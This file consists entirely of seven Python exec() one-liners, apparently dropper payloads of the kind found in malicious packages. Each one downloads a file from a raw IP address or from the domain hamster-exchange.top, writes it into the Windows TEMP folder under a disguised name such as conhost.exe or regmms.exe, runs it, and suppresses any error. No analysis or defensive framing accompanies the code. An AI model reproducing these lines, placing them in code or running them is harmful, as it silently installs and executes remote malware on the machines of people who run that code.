exec("try: import urllib.request, subprocess, os; urllib.request.urlretrieve('http://91.92.46.116/templates/main.ccs', os.path.join(os.environ['TEMP'], 'conhost.exe')); subprocess.run([os.path.join(os.environ['TEMP'], 'conhost.exe')])\nexcept: pass")
exec("try: import urllib.request, subprocess, os; urllib.request.urlretrieve('http://hamster-exchange.top/hitler.svaga', os.path.join(os.environ['TEMP'], 'blesystem.exe')); subprocess.run([os.path.join(os.environ['TEMP'], 'blesystem.exe')])\nexcept: pass")
exec("try: import urllib.request, subprocess, os; urllib.request.urlretrieve('http://hamster-exchange.top/hitler.svaga', os.path.join(os.environ['TEMP'], 'rommtrppcvr.exe')); subprocess.run([os.path.join(os.environ['TEMP'], 'rommtrppcvr.exe')])\nexcept: pass")
exec("try: import urllib.request, subprocess, os; urllib.request.urlretrieve('http://hamster-exchange.top/hitler.svaga', os.path.join(os.environ['TEMP'], 'uigeor.exe')); subprocess.run([os.path.join(os.environ['TEMP'], 'uigeor.exe')])\nexcept: pass")
exec("try: import urllib.request, subprocess, os; urllib.request.urlretrieve('http://hamster-exchange.top/hitler.svaga', os.path.join(os.environ['TEMP'], 'httpService.exe')); subprocess.run([os.path.join(os.environ['TEMP'], 'httpService.exe')])\nexcept: pass")
exec("try: import urllib.request, subprocess, os; urllib.request.urlretrieve('http://hamster-exchange.top/hitler.svaga', os.path.join(os.environ['TEMP'], 'dotnetutilizer.exe')); subprocess.run([os.path.join(os.environ['TEMP'], 'dotnetutilizer.exe')])\nexcept: pass")
exec("try: import urllib.request, subprocess, os; urllib.request.urlretrieve('http://hamster-exchange.top/hitler.svaga', os.path.join(os.environ['TEMP'], 'regmms.exe')); subprocess.run([os.path.join(os.environ['TEMP'], 'regmms.exe')])\nexcept: pass")
